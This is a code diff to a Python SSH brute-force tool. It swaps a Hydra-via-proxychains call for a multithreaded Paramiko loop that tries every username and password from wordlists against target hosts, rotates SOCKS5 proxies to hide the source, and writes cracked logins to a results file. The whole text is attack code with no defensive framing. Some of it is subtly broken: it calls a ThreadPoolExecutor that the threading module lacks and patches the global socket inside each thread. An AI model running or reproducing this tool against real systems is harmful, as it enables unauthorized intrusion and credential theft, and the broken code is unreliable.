@@ -1,10 +1,15 @@
-from globals import global_live_hosts, global_tested_proxies  # Import global variables
+from globals import global_live_hosts, global_tested_proxies, global_config, pause_event, stop_event
 import subprocess
 import os
-import random
+import time
+import threading
+import socks
+import socket
 from itertools import cycle
+from tqdm import tqdm
+from termcolor import colored
 
-
+# Load wordlists for SSH Bruteforce
 def load_wordlists():
     """
     Load usernames and passwords from the wordlists directory.
@@ -12,8 +17,8 @@ def load_wordlists():
     :return: Tuple (usernames, passwords)
     """
     wordlist_dir = "wordlists"
-    username_file = f"{wordlist_dir}/ssh_usernames.txt"
-    password_file = f"{wordlist_dir}/ssh_passwords.txt"
+    username_file = os.path.join(wordlist_dir, "ssh_usernames.txt")
+    password_file = os.path.join(wordlist_dir, "ssh_passwords.txt")
 
     usernames, passwords = [], []
 
@@ -37,59 +42,81 @@ def load_wordlists():
     return usernames, passwords
 
 
+# Perform SSH Bruteforce
 def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
     """
-    Perform SSH brute force attack using Hydra and SOCKS5 proxies.
+    Perform SSH brute force attack using Paramiko.
 
     :param targets: List of target hosts to attack
     :param usernames: List of usernames to test
     :param passwords: List of passwords to test
     :param max_threads: Maximum number of concurrent threads
     """
+    from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
+
     results_file = "results/cracked.txt"
+    os.makedirs("results", exist_ok=True)
+
     print("[INFO] Starting brute force attack...")
+    proxy_cycle = cycle(global_tested_proxies) if global_config["proxy_usage"] else None
 
-    if not global_tested_proxies:
-        print("[ERROR] No valid SOCKS5 proxies found. Load and test proxies first.")
-        return
+    def attempt_login(host, username, password, proxy=None):
+        """
+        Attempt SSH login for a single target using Paramiko.
 
-    # Cycle through available proxies
-    proxy_cycle = cycle(global_tested_proxies)
+        :param host: Target host
+        :param username: SSH username
+        :param password: SSH password
+        :param proxy: Optional SOCKS5 proxy
+        :return: None
+        """
+        # Check if scan is paused or stopped
+        while pause_event.is_set():
+            time.sleep(0.5)
 
-    for target in targets:
-        print(f"[INFO] Targeting {target}...")
-
-        # Get the next available proxy
-        proxy_host, proxy_port = next(proxy_cycle)
+        if stop_event.is_set():
+            print("[INFO] Stopping brute force attack.")
+            return
 
         try:
-            print(f"[INFO] Using SOCKS5 Proxy: {proxy_host}:{proxy_port}")
+            # Set up SSH client
+            client = SSHClient()
+            client.set_missing_host_key_policy(AutoAddPolicy())
 
-            # Run Hydra with the proxy
-            subprocess.run(
-                [
-                    "proxychains4",  # ProxyChains must be installed for this to work
-                    "hydra",
-                    "-L",
-                    "wordlists/ssh_usernames.txt",
-                    "-P",
-                    "wordlists/ssh_passwords.txt",
-                    target,
-                    "ssh",
-                    "-o",
-                    results_file,
-                    "-t",
-                    str(max_threads),
-                    "-vV",
-                ],
-                check=True,
-            )
+            # Apply proxy settings if enabled
+            if proxy:
+                proxy_host, proxy_port = proxy
+                socks.setdefaultproxy(socks.SOCKS5, proxy_host, int(proxy_port))
+                socket.socket = socks.socksocket
 
-            print(f"[INFO] Results saved to {results_file}")
+            # Connect using username/password
+            client.connect(host, username=username, password=password, timeout=global_config["scan_timeout"])
+            print(colored(f"[SUCCESS] {host} - {username}:{password}", "green"))
 
-        except FileNotFoundError:
-            print("[ERROR] Hydra or ProxyChains is not installed or not found in PATH.")
-        except subprocess.CalledProcessError:
-            print(f"[ERROR] Hydra failed to brute force {target}.")
+            # Save successful credentials
+            with open(results_file, "a") as file:
+                file.write(f"{host} {username}:{password}\n")
+
+            client.close()
+
+        except AuthenticationException:
+            pass  # Ignore failed attempts
+
         except Exception as e:
-            print(f"[ERROR] Unexpected error: {e}")
+            print(colored(f"[ERROR] {host} - {username}:{password}: {e}", "red"))
+
+    # Start multithreaded bruteforcing
+    with threading.ThreadPoolExecutor(max_threads) as executor:
+        futures = []
+        for target in targets:
+            proxy = next(proxy_cycle) if proxy_cycle else None
+            for username in usernames:
+                for password in passwords:
+                    futures.append(
+                        executor.submit(attempt_login, target, username, password, proxy)
+                    )
+
+        for future in tqdm(futures, desc="Bruteforcing SSH", total=len(futures)):
+            future.result()  # Ensure exceptions are caught
+
+    print(f"[INFO] Brute force complete. Results saved to {results_file}.")
